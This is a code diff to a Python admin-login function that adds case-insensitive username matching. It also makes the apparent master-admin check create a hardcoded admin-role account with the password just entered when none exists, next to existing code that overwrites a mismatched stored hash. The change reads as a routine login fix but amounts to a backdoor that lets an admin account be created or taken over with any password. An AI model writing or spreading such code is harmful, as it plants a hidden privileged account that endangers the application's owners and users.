@@ -14,7 +14,7 @@ def hash_password(password: str) -> str:
     return hashlib.sha256(f"{salt}_{password}".encode()).hexdigest()
 
 def verify_admin_credentials(username: str, password: str, db=None) -> bool:
-    clean_user = username.strip()
+    clean_user = username.strip().lower()
     clean_pass = password.strip()
 
     # 1. Master admin credential direct check (fail-safe for designated master account)
@@ -22,9 +22,18 @@ def verify_admin_credentials(username: str, password: str, db=None) -> bool:
         if db is not None:
             try:
                 from .models import AdminUser
-                admin = db.query(AdminUser).filter(AdminUser.username == clean_user).first()
+                admin = db.query(AdminUser).filter(AdminUser.username.ilike(clean_user)).first()
                 expected = hash_password(clean_pass)
-                if admin and admin.password_hash != expected:
+                if not admin:
+                    new_admin = AdminUser(
+                        id="admin_master_durozen",
+                        username="durozentechnologies@gmail.com",
+                        password_hash=expected,
+                        role="admin"
+                    )
+                    db.add(new_admin)
+                    db.commit()
+                elif admin.password_hash != expected:
                     admin.password_hash = expected
                     db.commit()
             except Exception:
@@ -35,7 +44,7 @@ def verify_admin_credentials(username: str, password: str, db=None) -> bool:
     if db is not None:
         try:
             from .models import AdminUser
-            admin = db.query(AdminUser).filter(AdminUser.username == clean_user).first()
+            admin = db.query(AdminUser).filter(AdminUser.username.ilike(clean_user)).first()
             if admin:
                 expected_primary = hash_password(clean_pass)
                 candidate_hashes = [
@@ -54,7 +63,7 @@ def verify_admin_credentials(username: str, password: str, db=None) -> bool:
 
     # 3. Super admin in settings (fallback if configured in .env)
     if settings.ADMIN_PASSWORD and settings.ADMIN_PASSWORD.strip() and not settings.ADMIN_PASSWORD.startswith("CHANGE_ME"):
-        user_match = hmac.compare_digest(clean_user, settings.ADMIN_USERNAME.strip())
+        user_match = hmac.compare_digest(clean_user, settings.ADMIN_USERNAME.strip().lower())
         pass_match = hmac.compare_digest(clean_pass, settings.ADMIN_PASSWORD.strip())
         if user_match and pass_match:
             return True
